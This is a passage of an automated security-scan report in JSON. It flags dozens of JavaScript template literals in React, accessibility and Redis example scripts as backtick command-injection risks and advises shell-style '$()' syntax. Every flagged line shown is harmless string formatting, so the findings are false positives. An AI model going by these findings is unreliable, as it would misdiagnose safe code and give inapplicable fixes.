        "evidence": "lines.push(`  Ratio: ${ratio}x difference`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/frontend/react-state-management/resources/scripts/detect_unnecessary_renders.js",
        "line_number": 31,
        "issue": "Backtick command execution",
        "evidence": "console.error(`Error analyzing ${file}:`, error.message);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/frontend/react-state-management/resources/scripts/detect_unnecessary_renders.js",
        "line_number": 181,
        "issue": "Backtick command execution",
        "evidence": "message: `${matches.length} inline object props detected. Extract to variables or useMemo.`,",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/frontend/react-state-management/resources/scripts/detect_unnecessary_renders.js",
        "line_number": 198,
        "issue": "Backtick command execution",
        "evidence": "message: `${arrayMatches.length} inline array props detected. Extract to variables or useMemo.`,",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/frontend/react-state-management/resources/scripts/detect_unnecessary_renders.js",
        "line_number": 227,
        "issue": "Backtick command execution",
        "evidence": "message: `Component has ${propCount} props but is not memoized. Consider React.memo.`,",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/frontend/react-state-management/resources/scripts/detect_unnecessary_renders.js",
        "line_number": 246,
        "issue": "Backtick command execution",
        "evidence": "message: `${matches.length} inline callbacks detected. Consider useCallback for expensive child components.`,",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/frontend/react-state-management/resources/scripts/detect_unnecessary_renders.js",
        "line_number": 312,
        "issue": "Backtick command execution",
        "evidence": "message: `Component uses ${matches.length} contexts. Consider consolidating or using a state library.`,",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/frontend/react-state-management/resources/scripts/detect_unnecessary_renders.js",
        "line_number": 344,
        "issue": "Backtick command execution",
        "evidence": "message: `${expensiveOps} expensive operations detected without useMemo. Consider memoization.`,",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/frontend/react-state-management/resources/scripts/detect_unnecessary_renders.js",
        "line_number": 409,
        "issue": "Backtick command execution",
        "evidence": "lines.push(`  Total issues: ${report.summary.total}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/frontend/react-state-management/resources/scripts/detect_unnecessary_renders.js",
        "line_number": 410,
        "issue": "Backtick command execution",
        "evidence": "lines.push(`  Errors: ${report.summary.error}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/frontend/react-state-management/resources/scripts/detect_unnecessary_renders.js",
        "line_number": 411,
        "issue": "Backtick command execution",
        "evidence": "lines.push(`  Warnings: ${report.summary.warning}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/frontend/react-state-management/resources/scripts/detect_unnecessary_renders.js",
        "line_number": 412,
        "issue": "Backtick command execution",
        "evidence": "lines.push(`  Info: ${report.summary.info}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/frontend/react-state-management/resources/scripts/detect_unnecessary_renders.js",
        "line_number": 424,
        "issue": "Backtick command execution",
        "evidence": "lines.push(`  ${type}: ${issues.length}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/frontend/react-state-management/resources/scripts/detect_unnecessary_renders.js",
        "line_number": 441,
        "issue": "Backtick command execution",
        "evidence": "lines.push(`File: ${file}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/frontend/react-state-management/resources/scripts/detect_unnecessary_renders.js",
        "line_number": 453,
        "issue": "Backtick command execution",
        "evidence": "lines.push(`  Component: ${component}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/frontend/react-state-management/resources/scripts/detect_unnecessary_renders.js",
        "line_number": 457,
        "issue": "Backtick command execution",
        "evidence": "lines.push(`    [${severity}] Line ${issue.line}: ${issue.message}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/frontend/react-state-management/resources/scripts/detect_unnecessary_renders.js",
        "line_number": 530,
        "issue": "Backtick command execution",
        "evidence": "console.error(`Error: Directory ${directory} does not exist`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/frontend/react-state-management/resources/scripts/detect_unnecessary_renders.js",
        "line_number": 535,
        "issue": "Backtick command execution",
        "evidence": "console.error(`Error: ${directory} is not a directory`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/frontend/react-state-management/resources/scripts/detect_unnecessary_renders.js",
        "line_number": 539,
        "issue": "Backtick command execution",
        "evidence": "console.error(`Analyzing React components in ${directory}...`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/frontend/web-accessibility/resources/scripts/test_keyboard_nav.js",
        "line_number": 124,
        "issue": "Backtick command execution",
        "evidence": "result.addTest('page-load', false, `Failed to load page: ${error.message}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/frontend/web-accessibility/resources/scripts/test_keyboard_nav.js",
        "line_number": 185,
        "issue": "Backtick command execution",
        "evidence": "`All ${elements.total} interactive elements are focusable`,",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/frontend/web-accessibility/resources/scripts/test_keyboard_nav.js",
        "line_number": 191,
        "issue": "Backtick command execution",
        "evidence": "`${elements.nonFocusable.length} of ${elements.total} interactive elements are not focusable`,",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/frontend/web-accessibility/resources/scripts/test_keyboard_nav.js",
        "line_number": 196,
        "issue": "Backtick command execution",
        "evidence": "result.addTest('focusable-elements', false, `Test failed: ${error.message}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/frontend/web-accessibility/resources/scripts/test_keyboard_nav.js",
        "line_number": 274,
        "issue": "Backtick command execution",
        "evidence": "`Found ${positiveTabIndex.length} elements with positive tabindex (anti-pattern)`,",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/frontend/web-accessibility/resources/scripts/test_keyboard_nav.js",
        "line_number": 282,
        "issue": "Backtick command execution",
        "evidence": "`Tab order tested with ${tabOrder.length} focusable elements`,",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/frontend/web-accessibility/resources/scripts/test_keyboard_nav.js",
        "line_number": 287,
        "issue": "Backtick command execution",
        "evidence": "result.addTest('tab-order', false, `Test failed: ${error.message}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/frontend/web-accessibility/resources/scripts/test_keyboard_nav.js",
        "line_number": 334,
        "issue": "Backtick command execution",
        "evidence": "`All ${indicators.total} focusable elements have visible focus indicators`,",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/frontend/web-accessibility/resources/scripts/test_keyboard_nav.js",
        "line_number": 340,
        "issue": "Backtick command execution",
        "evidence": "`${indicators.missingIndicators.length} of ${indicators.total} elements lack visible focus indicators`,",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/frontend/web-accessibility/resources/scripts/test_keyboard_nav.js",
        "line_number": 345,
        "issue": "Backtick command execution",
        "evidence": "result.addTest('focus-indicators', false, `Test failed: ${error.message}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/frontend/web-accessibility/resources/scripts/test_keyboard_nav.js",
        "line_number": 365,
        "issue": "Backtick command execution",
        "evidence": "const key = `${current.tagName}:${current.id}:${current.className}`;",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/frontend/web-accessibility/resources/scripts/test_keyboard_nav.js",
        "line_number": 416,
        "issue": "Backtick command execution",
        "evidence": "result.addTest('keyboard-traps', false, `Test failed: ${error.message}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/frontend/web-accessibility/resources/scripts/test_keyboard_nav.js",
        "line_number": 453,
        "issue": "Backtick command execution",
        "evidence": "`Skip link found: \"${skipLink.text}\" -> ${skipLink.href}`,",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/frontend/web-accessibility/resources/scripts/test_keyboard_nav.js",
        "line_number": 458,
        "issue": "Backtick command execution",
        "evidence": "`Skip link found but target doesn't exist: ${skipLink.href}`,",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/frontend/web-accessibility/resources/scripts/test_keyboard_nav.js",
        "line_number": 467,
        "issue": "Backtick command execution",
        "evidence": "result.addTest('skip-links', false, `Test failed: ${error.message}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/frontend/web-accessibility/resources/scripts/test_keyboard_nav.js",
        "line_number": 527,
        "issue": "Backtick command execution",
        "evidence": "`${interactive.length} potential keyboard interaction issues found`,",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/frontend/web-accessibility/resources/scripts/test_keyboard_nav.js",
        "line_number": 532,
        "issue": "Backtick command execution",
        "evidence": "result.addTest('interactive-elements', false, `Test failed: ${error.message}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/frontend/web-accessibility/resources/scripts/test_keyboard_nav.js",
        "line_number": 588,
        "issue": "Backtick command execution",
        "evidence": "result.addTest('modals', true, `${modals.total} modal(s) have proper attributes`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/frontend/web-accessibility/resources/scripts/test_keyboard_nav.js",
        "line_number": 592,
        "issue": "Backtick command execution",
        "evidence": "`${modals.issues.length} modal accessibility issues found`,",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/frontend/web-accessibility/resources/scripts/test_keyboard_nav.js",
        "line_number": 597,
        "issue": "Backtick command execution",
        "evidence": "result.addTest('modals', false, `Test failed: ${error.message}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/frontend/web-accessibility/resources/scripts/test_keyboard_nav.js",
        "line_number": 631,
        "issue": "Backtick command execution",
        "evidence": "const trigger = document.querySelector(`[aria-controls=\"${menu.id}\"]`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/frontend/web-accessibility/resources/scripts/test_keyboard_nav.js",
        "line_number": 668,
        "issue": "Backtick command execution",
        "evidence": "result.addTest('menus', true, `${menus.total} menu(s) have proper structure`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/frontend/web-accessibility/resources/scripts/test_keyboard_nav.js",
        "line_number": 672,
        "issue": "Backtick command execution",
        "evidence": "`${menus.issues.length} menu accessibility issues found`,",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/frontend/web-accessibility/resources/scripts/test_keyboard_nav.js",
        "line_number": 677,
        "issue": "Backtick command execution",
        "evidence": "result.addTest('menus', false, `Test failed: ${error.message}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/frontend/web-accessibility/resources/scripts/test_keyboard_nav.js",
        "line_number": 691,
        "issue": "Backtick command execution",
        "evidence": "lines.push(`URL: ${result.url}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/frontend/web-accessibility/resources/scripts/test_keyboard_nav.js",
        "line_number": 692,
        "issue": "Backtick command execution",
        "evidence": "lines.push(`Timestamp: ${result.timestamp}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/frontend/web-accessibility/resources/scripts/test_keyboard_nav.js",
        "line_number": 694,
        "issue": "Backtick command execution",
        "evidence": "lines.push(`Summary:`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/frontend/web-accessibility/resources/scripts/test_keyboard_nav.js",
        "line_number": 695,
        "issue": "Backtick command execution",
        "evidence": "lines.push(`  Total Tests: ${result.tests.length}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/frontend/web-accessibility/resources/scripts/test_keyboard_nav.js",
        "line_number": 696,
        "issue": "Backtick command execution",
        "evidence": "lines.push(`  Passed: ${result.passed}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/frontend/web-accessibility/resources/scripts/test_keyboard_nav.js",
        "line_number": 697,
        "issue": "Backtick command execution",
        "evidence": "lines.push(`  Failed: ${result.failed}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/frontend/web-accessibility/resources/scripts/test_keyboard_nav.js",
        "line_number": 698,
        "issue": "Backtick command execution",
        "evidence": "lines.push(`  Warnings: ${result.warnings}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/frontend/web-accessibility/resources/scripts/test_keyboard_nav.js",
        "line_number": 710,
        "issue": "Backtick command execution",
        "evidence": "lines.push(`${i + 1}. ${test.name}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/frontend/web-accessibility/resources/scripts/test_keyboard_nav.js",
        "line_number": 711,
        "issue": "Backtick command execution",
        "evidence": "lines.push(`   Message: ${test.message}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/frontend/web-accessibility/resources/scripts/test_keyboard_nav.js",
        "line_number": 713,
        "issue": "Backtick command execution",
        "evidence": "lines.push(`   Details: ${JSON.stringify(test.details, null, 2)}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/frontend/web-accessibility/resources/scripts/test_keyboard_nav.js",
        "line_number": 723,
        "issue": "Backtick command execution",
        "evidence": "lines.push(`${i + 1}. ${test.name}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/frontend/web-accessibility/resources/scripts/test_keyboard_nav.js",
        "line_number": 724,
        "issue": "Backtick command execution",
        "evidence": "lines.push(`   Message: ${test.message}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/frontend/web-accessibility/resources/scripts/test_keyboard_nav.js",
        "line_number": 726,
        "issue": "Backtick command execution",
        "evidence": "lines.push(`   Details: ${JSON.stringify(test.details, null, 2)}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/frontend/web-accessibility/resources/scripts/test_keyboard_nav.js",
        "line_number": 736,
        "issue": "Backtick command execution",
        "evidence": "lines.push(`${i + 1}. ${test.name}: ${test.message}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/frontend/web-accessibility/resources/scripts/test_keyboard_nav.js",
        "line_number": 811,
        "issue": "Backtick command execution",
        "evidence": "console.error(`Testing keyboard navigation: ${url}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/frontend/web-accessibility/resources/scripts/test_keyboard_nav.js",
        "line_number": 823,
        "issue": "Backtick command execution",
        "evidence": "console.error(`Report written to: ${options.output}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/frontend/web-accessibility/resources/scripts/test_keyboard_nav.js",
        "line_number": 832,
        "issue": "Backtick command execution",
        "evidence": "console.error(`Error: ${error.message}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/frontend/web-accessibility/resources/scripts/test_keyboard_nav.js",
        "line_number": 851,
        "issue": "Backtick command execution",
        "evidence": "console.error(`Fatal error: ${error.message}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/frontend/nextjs-seo/resources/scripts/test_metadata.js",
        "line_number": 88,
        "issue": "Backtick command execution",
        "evidence": "throw new Error(`File not found: ${filePath}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/frontend/nextjs-seo/resources/scripts/test_metadata.js",
        "line_number": 291,
        "issue": "Backtick command execution",
        "evidence": "lines.push(`NEXT.JS METADATA TEST: ${results.file}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/frontend/nextjs-seo/resources/scripts/test_metadata.js",
        "line_number": 298,
        "issue": "Backtick command execution",
        "evidence": "lines.push(`Metadata Type: ${results.hasStaticMetadata ? 'Static' : ''}${results.hasDynamicMetadata ? 'Dynamic' : ''}${!results.hasStaticMetadata && !results.hasDynamicMetadata ? 'None' : ''}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/frontend/nextjs-seo/resources/scripts/test_metadata.js",
        "line_number": 299,
        "issue": "Backtick command execution",
        "evidence": "lines.push(`Issues:        ${results.issues.length}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/frontend/nextjs-seo/resources/scripts/test_metadata.js",
        "line_number": 300,
        "issue": "Backtick command execution",
        "evidence": "lines.push(`Warnings:      ${results.warnings.length}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/frontend/nextjs-seo/resources/scripts/test_metadata.js",
        "line_number": 301,
        "issue": "Backtick command execution",
        "evidence": "lines.push(`Successes:     ${results.successes.length}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/frontend/nextjs-seo/resources/scripts/test_metadata.js",
        "line_number": 309,
        "issue": "Backtick command execution",
        "evidence": "lines.push(`[${issue.severity.toUpperCase()}] ${issue.category}: ${issue.message}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/frontend/nextjs-seo/resources/scripts/test_metadata.js",
        "line_number": 319,
        "issue": "Backtick command execution",
        "evidence": "lines.push(`[WARN] ${warning.category}: ${warning.message}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/frontend/nextjs-seo/resources/scripts/test_metadata.js",
        "line_number": 329,
        "issue": "Backtick command execution",
        "evidence": "lines.push(`[OK] ${success.category}: ${success.message}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/frontend/nextjs-seo/resources/scripts/test_metadata.js",
        "line_number": 400,
        "issue": "Backtick command execution",
        "evidence": "console.error(`Error: ${error.message}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/redis-data-structures/resources/examples/node/pubsub_example.js",
        "line_number": 42,
        "issue": "Backtick command execution",
        "evidence": "console.log(`[Publisher] Published to ${channel}: ${count} subscribers`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/redis-data-structures/resources/examples/node/pubsub_example.js",
        "line_number": 54,
        "issue": "Backtick command execution",
        "evidence": "console.log(`[Subscriber] Received on ${subscribedChannel}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/redis-data-structures/resources/examples/node/pubsub_example.js",
        "line_number": 68,
        "issue": "Backtick command execution",
        "evidence": "console.log(`[Subscriber] Subscribed to ${channel}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/redis-data-structures/resources/examples/node/pubsub_example.js",
        "line_number": 79,
        "issue": "Backtick command execution",
        "evidence": "console.log(`[Subscriber] Received on ${channel} (pattern: ${pattern})`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/redis-data-structures/resources/examples/node/pubsub_example.js",
        "line_number": 92,
        "issue": "Backtick command execution",
        "evidence": "console.log(`[Subscriber] Subscribed to pattern ${pattern}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/redis-data-structures/resources/examples/node/pubsub_example.js",
        "line_number": 103,
        "issue": "Backtick command execution",
        "evidence": "console.log(`[Subscriber] Unsubscribed from ${channel}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/redis-data-structures/resources/examples/node/pubsub_example.js",
        "line_number": 114,
        "issue": "Backtick command execution",
        "evidence": "console.log(`[Subscriber] Unsubscribed from pattern ${pattern}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/redis-data-structures/resources/examples/node/pubsub_example.js",
        "line_number": 162,
        "issue": "Backtick command execution",
        "evidence": "this.channel = `chat:room:${roomId}`;",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/redis-data-structures/resources/examples/node/pubsub_example.js",
        "line_number": 197,
        "issue": "Backtick command execution",
        "evidence": "console.log(`[ChatRoom] ${userId} joined ${this.roomId}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/redis-data-structures/resources/examples/node/pubsub_example.js",
        "line_number": 216,
        "issue": "Backtick command execution",
        "evidence": "console.log(`[ChatRoom] ${userId} left ${this.roomId}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/redis-data-structures/resources/examples/node/pubsub_example.js",
        "line_number": 238,
        "issue": "Backtick command execution",
        "evidence": "const channel = `notifications:user:${userId}`;",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/redis-data-structures/resources/examples/node/pubsub_example.js",
        "line_number": 253,
        "issue": "Backtick command execution",
        "evidence": "const channel = `notifications:user:${userId}`;",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/redis-data-structures/resources/examples/node/pubsub_example.js",
        "line_number": 294,
        "issue": "Backtick command execution",
        "evidence": "console.log(`  [Handler] Received: ${message}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/redis-data-structures/resources/examples/node/pubsub_example.js",
        "line_number": 324,
        "issue": "Backtick command execution",
        "evidence": "console.log(`  [Handler] Channel: ${channel}, Message: ${JSON.stringify(message)}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/redis-data-structures/resources/examples/node/pubsub_example.js",
        "line_number": 355,
        "issue": "Backtick command execution",
        "evidence": "console.log(`  [Chat] ${message.userId}: ${message.message}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/redis-data-structures/resources/examples/node/pubsub_example.js",
        "line_number": 357,
        "issue": "Backtick command execution",
        "evidence": "console.log(`  [Chat] ${message.userId} joined the room`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/redis-data-structures/resources/examples/node/pubsub_example.js",
        "line_number": 359,
        "issue": "Backtick command execution",
        "evidence": "console.log(`  [Chat] ${message.userId} left the room`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/redis-data-structures/resources/examples/node/pubsub_example.js",
        "line_number": 394,
        "issue": "Backtick command execution",
        "evidence": "console.log(`  [Notification] ${notification.type}:`, notification.data);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/redis-data-structures/resources/examples/node/pubsub_example.js",
        "line_number": 399,
        "issue": "Backtick command execution",
        "evidence": "console.log(`  [Broadcast] ${notification.type}:`, notification.data);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/redis-data-structures/resources/examples/node/pubsub_example.js",
        "line_number": 447,
        "issue": "Backtick command execution",
        "evidence": "console.log(`  [Service 1] Received: ${JSON.stringify(message)}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/redis-data-structures/resources/examples/node/pubsub_example.js",
        "line_number": 451,
        "issue": "Backtick command execution",
        "evidence": "console.log(`  [Service 2] Received: ${JSON.stringify(message)}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/redis-data-structures/resources/examples/node/pubsub_example.js",
        "line_number": 455,
        "issue": "Backtick command execution",
        "evidence": "console.log(`  [Service 3] Received: ${JSON.stringify(message)}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/redis-data-structures/resources/examples/node/pubsub_example.js",
        "line_number": 463,
        "issue": "Backtick command execution",
        "evidence": "console.log(`  Subscribers on ${channel}: ${count}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/redis-data-structures/resources/examples/node/pubsub_example.js",
        "line_number": 496,
        "issue": "Backtick command execution",
        "evidence": "console.log(`  [Cache] Invalidated: ${key}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/redis-data-structures/resources/examples/node/pubsub_example.js",
        "line_number": 506,
        "issue": "Backtick command execution",
        "evidence": "console.log(`  [Cache] Size: ${cache.size}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/redis-data-structures/resources/examples/node/pubsub_example.js",
        "line_number": 514,
        "issue": "Backtick command execution",
